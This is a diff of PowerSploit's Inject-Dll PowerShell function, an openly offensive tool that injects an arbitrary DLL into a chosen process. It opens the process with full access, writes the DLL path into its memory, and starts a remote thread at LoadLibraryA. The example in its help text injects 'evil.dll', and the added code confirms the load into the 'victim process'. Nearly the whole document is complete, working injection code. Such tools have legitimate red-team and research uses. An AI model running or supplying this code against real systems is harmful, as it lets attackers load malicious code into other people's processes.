@@ -1,68 +1,90 @@
 function Inject-Dll {
 
 <#
-.Synopsis
+.SYNOPSIS
 
- PowerSploit Module - Inject-Dll
- Author: Matthew Graeber (@mattifestation)
- License: BSD 3-Clause
- 
-.Description
+    PowerSploit Module - Inject-Dll
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
 
- Inject-Dll injects a Dll into the process ID of your choosing.
- 
-.Parameter ProcessID
+.DESCRIPTION
 
- Process ID of the process you want to inject a Dll into.
- 
-.Parameter Dll
+    Inject-Dll injects a Dll into the process ID of your choosing.
 
- Name of the dll to inject. This can be an absolute or relative path.
- 
-.Example
+.PARAMETER ProcessID
 
- PS> Inject-DLL 4274 evil.dll
- 
- Description
- -----------
- Inject 'evil.dll' into process ID 4274.
- 
-.Notes
+    Process ID of the process you want to inject a Dll into.
 
- Use the '-Verbose' option to print detailed information.
- 
-.Link
+.PARAMETER Dll
 
- My blog: http://www.exploit-monday.com
+    Name of the dll to inject. This can be an absolute or relative path.
+
+.EXAMPLE
+
+    C:\PS> Inject-DLL -ProcessID 4274 -Dll evil.dll
+
+    Description
+    -----------
+    Inject 'evil.dll' into process ID 4274.
+
+.NOTES
+
+    Use the '-Verbose' option to print detailed information.
+
+.LINK
+
+    http://www.exploit-monday.com
 #>
 
     Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Int] $ProcessID,
-        [Parameter(Position = 1, Mandatory = $True)] [String] $Dll
+        [Parameter( Position = 0,
+                    Mandatory = $True )]
+        [Int]
+        $ProcessID,
+
+        [Parameter( Position = 1,
+                    Mandatory = $True )]
+        [String]
+        $Dll
     )
 
-    try {
+    # Confirm that the process you want to inject into exists
+    try
+    {
         Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
-    } catch [System.Management.Automation.ActionPreferenceStopException] {
-        Write-Warning "Process does not exist!"
-        return
+    }
+    catch [System.Management.Automation.ActionPreferenceStopException]
+    {
+        Throw "Process does not exist!"
     }
     
-    try {
+    # Confirm that the path to the dll exists
+    try
+    {
         $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
         Write-Verbose "Full path to Dll: $Dll"
         $AsciiEncoder = New-Object System.Text.ASCIIEncoding
+        # Save the name of the dll in an ascii-encoded format. This name will be injected into the remote process.
         $DllByteArray = $AsciiEncoder.GetBytes($Dll)
-    } catch [System.Management.Automation.ActionPreferenceStopException] {
-        Write-Warning "Invalid Dll path!"
-        return
+    }
+    catch [System.Management.Automation.ActionPreferenceStopException]
+    {
+        Throw "Invalid Dll path!"
     }
 
-    function Get-DelegateType
+    function Local:Get-DelegateType
     {
-        Param (
-            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters,
-            [Parameter(Position = 1)] [Type] $ReturnType = [Void]
+        Param
+        (
+            [OutputType([Type])]
+            
+            [Parameter( Position = 0)]
+            [Type[]]
+            $Parameters = (New-Object Type[](0)),
+            
+            [Parameter( Position = 1 )]
+            [Type]
+            $ReturnType = [Void]
         )
 
         $Domain = [AppDomain]::CurrentDomain
@@ -75,14 +97,22 @@ function Inject-Dll {
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
         
-        return $TypeBuilder.CreateType()
+        Write-Output $TypeBuilder.CreateType()
     }
 
-    function Get-ProcAddress
+    function Local:Get-ProcAddress
     {
-        Param (
-            [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
-            [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
+        Param
+        (
+            [OutputType([IntPtr])]
+        
+            [Parameter( Position = 0, Mandatory = $True )]
+            [String]
+            $Module,
+            
+            [Parameter( Position = 1, Mandatory = $True )]
+            [String]
+            $Procedure
         )
 
         # Get a reference to System.dll in the GAC
@@ -96,11 +126,73 @@ function Inject-Dll {
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        # Return the address of the function
         
-        return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+        # Return the address of the function
+        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
+
+    function Local:Get-PEArchitecture
+    {
+        Param
+        (
+            [Parameter( Position = 0,
+                        Mandatory = $True )]
+            [String]
+            $Path
+        )
     
+        # Parse PE header to see if binary was compiled 32 or 64-bit
+        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    
+        [Byte[]] $MZHeader = New-Object Byte[](2)
+        $FileStream.Read($MZHeader,0,2) | Out-Null
+    
+        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
+        if ($Header -ne 'MZ')
+        {
+            $FileStream.Close()
+            Throw 'Invalid PE header.'
+        }
+    
+        # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
+        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
+    
+        [Byte[]] $lfanew = New-Object Byte[](4)
+    
+        # Read offset to the PE Header (will be read in reverse)
+        $FileStream.Read($lfanew,0,4) | Out-Null
+        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
+    
+        # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
+        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
+        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
+    
+        # Read compiled architecture
+        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
+        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
+        $FileStream.Close()
+    
+        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
+        {
+            Throw 'Invalid PE header or unsupported architecture.'
+        }
+    
+        if ($Architecture -eq '014C')
+        {
+            Write-Output 'X86'
+        }
+        elseif ($Architecture -eq '8664')
+        {
+            Write-Output 'X64'
+        }
+        else
+        {
+            Write-Output 'OTHER'
+        }
+    }
+
+    
+    # Get addresses of and declare delegates for essential Win32 functions.
     $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
     $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
     $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
@@ -120,50 +212,75 @@ function Inject-Dll {
     $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
     $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
 
-    $64bitCPU = $true
+    # Assume CPU to be 64-bit unless determined otherwise.
+    $64bitCPU = $True
     
-    if ([IntPtr]::Size -eq 4) { $PowerShell32bit = $true } else { $PowerShell32bit = $false }
+    # Determine the bitness of the running PowerShell process based upon the size of the IntPtr type.
+    if ([IntPtr]::Size -eq 4)
+    {
+        $PowerShell32bit = $True
+    }
+    else
+    {
+        $PowerShell32bit = $False
+    }
+
+    # The address for IsWow64Process will be returned if and only if running on a 64-bit CPU. Otherwise, Get-ProcAddress will return $null.
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
-    if ($IsWow64ProcessAddr) {
+
+    if ($IsWow64ProcessAddr)
+    {
     	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
     	$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
-    } else {
-    	$64bitCPU = $false
+    }
+    else
+    {
+        # IsWow64Process does not exist and thus, the CPU is not 64-bit.
+    	$64bitCPU = $False
     }
 
     # Open a handle to the process you want to inject into
     $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
-    if (!$hProcess) { Write-Warning 'Unable to open process handle.'; return }
+
+    if (!$hProcess)
+    {
+        THrow 'Unable to open process handle.'
+    }
+
+    $Architecture = Get-PEArchitecture $Dll
 
     if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
     {
-        # Parse PE header to see if DLL was compiled 32 or 64-bit
-        $DllFileStream = New-Object System.IO.FileStream($Dll, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-        # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
-        $temp = $DllFileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin)
-        [Byte[]]$TempByteArray = New-Object Byte[](4)
-        # Read offset to the PE Header (will be read in reverse)
-        $Temp = $DllFileStream.Read($TempByteArray,0,4)
-        $PEOffset = [Int] ('0x{0}' -f (( $TempByteArray[-1..-4] | % { $_.ToString('X2') } ) -join ''))
-        Write-Verbose "PE Offset: 0x$($PEOffset.ToString('X8'))"
-        # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
-        $DllFileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
-        [Byte[]]$TempByteArray2 = New-Object Byte[](2)
-        # Read compiled architecture
-        $Temp = $DllFileStream.Read($TempByteArray2,0,2)
-        $Architecture = '{0}' -f (( $TempByteArray2[-1..-2] | % { $_.ToString('X2') } ) -join '')
-        Write-Verbose "DLL Architecture: 0x$Architecture"
-        if (($Architecture -ne '014C') -and ($Architecture -ne '8664')) { Write-Warning 'Only x86 or AMD64 architechtures supported.'; return }
-        $DllFileStream.Close()
-
-        # Determine is the process specified is 32 or 64 bit
-        $IsWow64 = $false
-        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
-        if ( $PowerShell32bit -and ($Architecture -eq "8664") ) {
-            Write-Warning 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'; return
+        if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
+        {
+            Throw 'Only x86 or AMD64 architechtures supported.'
         }
-        if ((!$IsWow64) -and ($Architecture -eq "014C")) { Write-Warning 'You cannot inject a 32-bit DLL into a 64-bit process.'; return }
-        if ($IsWow64 -and ($Architecture -eq "8664")) { Write-Warning 'You cannot inject a 64-bit DLL into a 32-bit process.'; return }
+
+        # Determine is the process specified is 32 or 64 bit. Assume that it is 64-bit unless determined otherwise.
+        $IsWow64 = $False
+        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
+
+        if ( $PowerShell32bit -and ($Architecture -eq 'X64') )
+        {
+            Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
+        }
+
+        if ( (!$IsWow64) -and ($Architecture -eq 'X86') )
+        {
+            Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
+        }
+
+        if ( $IsWow64 -and ($Architecture -eq 'X64') )
+        {
+            Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
+        }
+    }
+    else
+    {
+        if ($Architecture -ne 'X86')
+        {
+            Throw 'PE file was not compiled for x86.'
+        }
     }
 
     # Get address of LoadLibraryA function
@@ -171,18 +288,23 @@ function Inject-Dll {
     Write-Verbose "LoadLibrary address: 0x$($LoadLibraryAddr.ToString("X$([IntPtr]::Size*2)"))"
 
     # Reserve and commit memory to hold name of dll
-    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) # (Reserve|Commit, RW)
-    if ($RemoteMemAddr -eq [IntPtr]::Zero) { Write-Warning 'Unable to allocate memory in remote process.'; return }
+    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) # (0x3000 = Reserve|Commit, 4 = RW)
+    if ($RemoteMemAddr -eq [IntPtr]::Zero)
+    {
+        Throw 'Unable to allocate memory in remote process.'
+    }
     Write-Verbose "DLL path memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
-    Write-Verbose "Number of chars in Dll path: $($DllByteArray.Length)"
     # Write the name of the dll to the remote process address space
     $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
     Write-Verbose "Dll path written sucessfully."
 
     # Execute dll as a remote thread
-    $threadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $LoadLibraryAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
-    if (!$threadHandle) { Write-Warning 'Unable to launch remote thread.'; return }
+    $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $LoadLibraryAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
+    if (!$ThreadHandle)
+    {
+        Throw 'Unable to launch remote thread.'
+    }
     
     $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
 
@@ -190,6 +312,15 @@ function Inject-Dll {
     $CloseHandle.Invoke($hProcess) | Out-Null
 
     Write-Verbose 'Dll injection complete!'
-    Write-Verbose 'Execute `(Get-Process -Id [ProcessId]).Modules` to confirm.'
-    
+
+    # Extract just the filename from the provided path to the dll.
+    $FileName = Split-Path $Dll -Leaf
+    $DllInfo = (Get-Process -Id $ProcessID).Modules | ? { $_.FileName.Contains($FileName) } | fl * | Out-String
+
+    if (!$DllInfo)
+    {
+        Throw "Dll did dot inject properly into the victim process."
+    }
+
+    Write-Verbose "Injected DLL information:$($DllInfo)"
 }
